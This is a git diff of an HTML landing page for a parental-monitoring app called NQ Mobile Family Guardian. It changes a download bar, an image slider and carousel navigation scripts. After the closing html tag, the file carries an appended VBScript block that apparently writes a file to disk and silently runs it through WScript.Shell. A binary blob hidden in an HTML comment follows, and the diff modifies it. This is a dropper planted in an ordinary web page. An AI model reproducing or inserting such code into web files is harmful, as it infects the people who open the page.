@@ -44,13 +44,15 @@
       </div>
     </div>
   </div>
-  <div class="rebon-down"> <a href="#">Download NQ Mobile Family Guardian<sup>&trade;</sup> for mobile, tablet, and other devices</a> </div>
-  <div class="brand-all">
+  <div class="scroll-down-dounload">
+  	<div class="rebon-down"> <a href="#">Download NQ Mobile Family Guardian<sup>&trade;</sup> for mobile, tablet, and other devices</a> </div>
+  	<div class="brand-all">
     <ul>
       <li class="app-store"><a href="#"><img width="135" height="47" alt="app store" src="images/app-store.png"></a></li>
       <li class="google-play"><a href="#"><img width="135" height="47" alt="google play" src="images/google-play.png"></a></li>
       <li class="windows"><a href="#"><img width="142" height="47" alt="Windows" src="images/Windows-black.png"></a></li>
     </ul>
+  </div>
   </div>
 </div>
 
@@ -111,7 +113,14 @@ are kid-friendly.</p>
         </ul>
       </div>
       <div class="span4">
-        <div class="phone-nq"><!--img src="images/mobile-screen.png" width="257" height="411" alt="mobile-screen"--></div>
+        <div class="phone-nq">        
+        <div id="" class="fadein">
+            <img src="images/mobile-screen.png" width="257" height="411" alt="mobile-screen">
+            <img src="images/mobile-screen2.png" width="257" height="411" alt="mobile-screen">
+            <img src="images/mobile-screen3.png" width="257" height="411" alt="mobile-screen">
+        </div>
+        
+        </div>
       </div>
     </div>
   </div>
@@ -185,16 +194,16 @@ if they need your help.  </p>
         <div class="slid-inside-scoop">
            <div id="myCarousel" class="carousel slide">
             <ol class="carousel-indicators">
-                <li data-target="#myCarousel" data-slide-to="0" class="active">Calls & Messages</li>
-                <li data-target="#myCarousel" data-slide-to="1">Locations</li>
-                <li data-target="#myCarousel" data-slide-to="2">Camera Photos</li>
-                <li data-target="#myCarousel" data-slide-to="3">Browser History</li>
-                <li data-target="#myCarousel" data-slide-to="4">Apps</li>
-                <li class="end" data-target="#myCarousel" data-slide-to="5">Contacts</li>
+                <li id="changeslideli_5" data-target="#myCarousel" data-slide-to="0" class="active" onClick="changeSlide(5)">Calls & Messages</li>
+                <li id="changeslideli_4" data-target="#myCarousel" data-slide-to="1" onClick="changeSlide(4)">Locations</li>
+                <li id="changeslideli_3" data-target="#myCarousel" data-slide-to="2" onClick="changeSlide(3)">Camera Photos</li>
+                <li id="changeslideli_2" data-target="#myCarousel" data-slide-to="3" onClick="changeSlide(2)">Browser History</li>
+                <li id="changeslideli_1" data-target="#myCarousel" data-slide-to="4" onClick="changeSlide(1)">Apps</li>
+                <li id="changeslideli_0" class="end" data-target="#myCarousel" data-slide-to="5" onClick="changeSlide(0)">Contacts</li>
             </ol>
             <!-- Carousel items -->
             <div class="carousel-inner clearfix">
-                <div class="active item clearfix">
+                <div class="item clearfix" id="0">
                 	<div class="span6">
                     	<div class="slide-align"><img src="images/sms-box.png" /></div>
                     </div>
@@ -206,7 +215,7 @@ if they need your help.  </p>
                         </div>
                     </div>
                 </div>
-                <div class="item apps">
+                <div class="item apps" id="1">
                 	<div class="span6">
                     	<div class="slide-align"><img src="images/apps-img.png" width="345" height="348"></div>
                     </div>
@@ -219,7 +228,7 @@ if they need your help.  </p>
                         </div>
                     </div>
                 </div>
-                <div class="item browser">
+                <div class="item browser" id="2">
                 	<div class="span6">
                     	<div class="slide-align">
                         	<h5>Show history from the past :  <span class="blue">2 weeks</span></h5>
@@ -248,7 +257,7 @@ or if they are outside their safety zone.</p>
                         </div>
                     </div>
                 </div>
-                <div class="item camera">
+                <div class="item camera" id="3">
                 	<div class="span6">
                     	<div class="slide-align">
                    	    	<img src="images/camera-photo.png" width="341" height="422">
@@ -264,7 +273,7 @@ or if they are outside their safety zone.</p>
                         </div>
                     </div>
                 </div>
-                <div class="item location">
+                <div class="item location" id="4">
                 	<div class="span6">
                     	<div class="slide-align">
            	    	    	<img src="images/location-mape.png" width="507" height="422">
@@ -280,7 +289,7 @@ or if they are outside their safety zone.</p>
                         </div>
                     </div>
                 </div>
-                <div class="item messages">
+                <div class="active item messages" id="5">
                 	<div class="span6">
                     	<div class="slide-align">
            	    	    	<ul>
@@ -321,8 +330,8 @@ or if they are outside their safety zone.</p>
                 </div>
             </div>
             <!-- Carousel nav -->
-            <a class="carousel-control left" href="#myCarousel" data-slide="prev">&lsaquo;</a>
-            <a class="carousel-control right" href="#myCarousel" data-slide="next">&rsaquo;</a>
+            <a class="carousel-control left" href="#myCarousel" data-slide="prev" onClick="getArrowPos()">&lsaquo;</a>
+            <a class="carousel-control right" href="#myCarousel" data-slide="next" onClick="getArrowPos()">&rsaquo;</a>
             </div>
         </div>
     </div>
@@ -474,21 +483,76 @@ running Android 2.2 and up</em>
     </div>
   </footer>
 </div>
+
+
 <!-- Le javascript  
     ================================================== --> 
 <!-- Placed at the end of the document so the pages load faster --> 
+<!-- Slider smaller -->
+<script src="js/jquery.js"></script>
+<script>
+$(function(){
+	$('.fadein img:gt(0)').hide();
+	setInterval(function(){$('.fadein :first-child').fadeOut().next('img').fadeIn().end().appendTo('.fadein');}, 3000);
+});
+</script>
 
-<script src="assets/js/scale.fix.js"></script>
+<!-- scale smaller -->
+<script src="js/scale.fix.js"></script>
 
 <script src="js/latest-jquery.js"></script>
 <script src="js/bootstrap.min.js"></script>
 <script type="text/javascript">
 	$(function(){
-		$('.carousel').carousel({
+		$('#myCarousel').carousel({
 			interval: false
 		})
 	})
 </script>
+
+
+<script type="text/javascript">
+	jQuery("document").ready(function(){
+    
+    var nav__ = $('.scroll-down-dounload');
+    
+    $(window).scroll(function() {
+        if ($(this).scrollTop() > 539) {
+            nav__.addClass("f-nav");
+        } else {
+            nav__.removeClass("f-nav");
+        }
+    });
+});
+
+function changeSlide(slideNo){
+  $('#myCarousel').carousel(slideNo); 
+  $('.carousel-indicators li').removeClass('active');
+  $('#changeslideli_'+slideNo).addClass('active');
+  return false;  
+}
+
+function getArrowPos(){	
+    var pos = $('.carousel-inner > div.active').attr('id');
+	$('.carousel-indicators li').removeClass('active');
+    $('#changeslideli_'+pos).addClass('active');	
+//	console.log(pos);
+	return false;
+}
+/*function getArrowPosnext(){	
+    var pos = $('.carousel-inner > div.active').attr('id');
+	var count = 1;
+	pos = parseInt(pos)+count;
+	$('.carousel-indicators li').removeClass('active');
+    $('#changeslideli_'+pos).addClass('active');	
+	console.log(pos);
+	return false;
+}*/
+</script>
+
+
+
+
 </body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -505,4 +569,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--âÆz×Ž!$;¸B,ê0=¢aÛ…<RaWAðê1«€áµ9vX²$1oN	¡P¿±­ÊÄbÇñÄhÀŸì§¦„ÇÐ7œÇÉ$ý¼Ýé¢*O(žÀ‘ÐÞÆý’kÈŽ:_9oüî(~:ð¡§sÕÐT™s²~ßPÈu±ÑªhJŒƒg"Z=äJW4‹¾Æ‹:ÊÅFÚ¢ép®¢PUKÃøÛK“âÕ¡î-0^Óûð(xëø/äãZz“¸vEAýEE¢ç÷ûÁ<b©ƒ./W”«@@oQän:e·Æp8; eZÂ^Ã¨R½C”nX;ŒÎÙ°l°’X“[ÀöV‹×ƒDiamâIÊìG‚- î*õZp…µÎLYú5žüŠæôYæ§{Ý˜$ á"R"9øá"á"á"¬ÿNÖ)SÝ²" á"-->
+//--></SCRIPT><!--û.¥ÅLÉb&)p.MÁ•  •$Ô§T!€9x’…2wé¨7þŸ]ï¥Û:šy„!)Õ7Ûø$c¥›¿V<ô¼shÈÜ•µVcŒYÌ×¹²bõXr¼«ü•UÂÏ° ù|if«rHºË2ÒlÉ‚¸Œh#+ƒ¸mƒ¹`– l7£¡†?˜º?Æ¢è±&Ìý¡A/p@#Ö|Î
+ã>RYB]Žßõ>û_g‚+“O•&üòHñú[›¢¨ªûªiÀÑ–¶¢L™Ëx×Xø2L¤%VÁ¥éšDfVFZ8±½¥Ñ„Ï³ç=§/õÝww•Ó©Ã-lWøºÏª¨9„J–ãõ×_ø?2b
+rt²ó°KNÅÜÚz(y‚7¶š5– ûƒ<,aº×" ²•æ*Š¤^CÔô†TpºÕAˆ‹LpØ¢9øL	\—¯ÀÊ`¥ç–(Aút¸’ºPDÛÙÁ(Øg¶8šð©¥°žiDu†Ä½1(§À<ß*¹„6ØÒó¤½›Šk58$~â"àB}+KfïÅ]¶ÝÑëæA–îÉËçÉÆÄqÁ˜í“ë*R]bæT»ÐFºµ#úK3ÎeÄ»µ71µ« ÛùRâûÛùÛùÛù–$MbeÍPÞ€ù Ûù-->
